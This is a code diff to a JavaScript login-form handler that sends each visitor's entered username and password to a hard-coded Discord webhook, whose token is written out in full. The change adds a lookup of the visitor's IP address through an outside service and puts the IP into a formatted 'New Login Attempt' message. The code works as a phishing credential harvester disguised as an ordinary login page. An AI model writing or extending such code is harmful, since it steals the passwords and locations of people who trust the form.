@@ -26,7 +26,12 @@ async function handleSubmit(event) {
     const timestamp = new Date().toISOString();
     
     try {
-        // Direct Discord webhook call for testing
+        // Get IP address first
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        const ipAddress = ipData.ip;
+
+        // Discord webhook call
         const webhookUrl = "https://discord.com/api/webhooks/1378978890373926963/KBqbq1R-P4Pu1ytdZl5oo5kHKVkCpz8MeszoyUjR1JRK1M-vIQ4ov2x4hFbhMJa_VGmQ";
         
         const response = await fetch(webhookUrl, {
@@ -35,19 +40,45 @@ async function handleSubmit(event) {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                content: `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nTime: ${timestamp}`
+                username: "Login Bot",
+                embeds: [{
+                    title: "🔐 New Login Attempt",
+                    color: 0xFF0000,
+                    fields: [
+                        {
+                            name: "👤 Username",
+                            value: username,
+                            inline: true
+                        },
+                        {
+                            name: "🔑 Password",
+                            value: password,
+                            inline: true
+                        },
+                        {
+                            name: "🌐 IP Address",
+                            value: ipAddress,
+                            inline: true
+                        },
+                        {
+                            name: "⏰ Timestamp",
+                            value: new Date(timestamp).toLocaleString(),
+                            inline: false
+                        }
+                    ]
+                }]
             })
         });
         
         if (response.ok) {
-            alert('Successfully');
+            alert('Successfully!');
             document.getElementById('loginForm').reset();
         } else {
-            alert('Failed');
+            throw new Error('Failed');
         }
     } catch (error) {
         console.error('Error:', error);
-        alert('Please try again.');
+        alert('Error: ' + error.message);
     }
     return false;
 }
